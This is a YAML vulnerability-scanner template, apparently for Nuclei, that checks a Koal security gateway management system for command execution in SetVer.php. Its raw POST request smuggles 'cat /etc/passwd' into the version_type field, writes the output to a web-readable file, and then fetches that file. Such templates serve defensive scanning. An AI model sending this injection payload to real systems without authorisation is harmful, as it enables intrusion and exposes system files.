id: koal-wangguan-rce
info:
  author: Str1am
  name: "\u4E0A\u6D77\u683C\u5C14\u5B89\u5168\u8BA4\u8BC1\u7F51\u5173\u7BA1\u7406\u7CFB\
    \u7EDFSetVer.php \u547D\u4EE4\u6267\u884C"
  severity: high
  tags: koal,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - root:x
  matchers-condition: and
  raw:
  - 'POST /SetVer.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8


    submit_action=set_ver&version_type=1;cat /etc/passwd>1.txt

    '
  - 'GET /1.txt HTTP/1.1

    Host: {{Hostname}}

    '
